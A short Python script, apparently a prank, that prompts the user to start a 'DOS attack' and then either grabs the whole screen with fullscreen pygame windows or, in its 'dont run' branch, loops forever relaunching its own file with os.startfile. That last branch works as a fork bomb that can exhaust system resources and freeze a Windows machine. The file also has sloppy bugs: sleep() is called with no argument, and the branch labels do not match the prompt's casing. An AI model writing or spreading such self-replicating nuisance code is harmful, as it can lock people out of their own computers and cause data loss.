import pygame
from time import sleep
import os
pygame.init()
start = input("DO YOU WANT TO START DOS ATTACK (YES/NO/DONT RUN :")

if start == "YES":
    print("THANKYOU FOR START  THIS DOS ATTACK")
    pygame.init()
    screen = pygame.display.set_mode((0,0) , pygame.FULLSCREEN)
    sleep(300)
elif start == "NO":
    print(" WHY  ")
    while True:
        pygame.init()
        scerrn2 = pygame.display.set_mode((0,0), pygame.FULLSCREEN)
        sleep()
elif start == "dont run":
    #THIS IS GAME CHANGER
    while True:
        os.startfile(__file__)
        

        
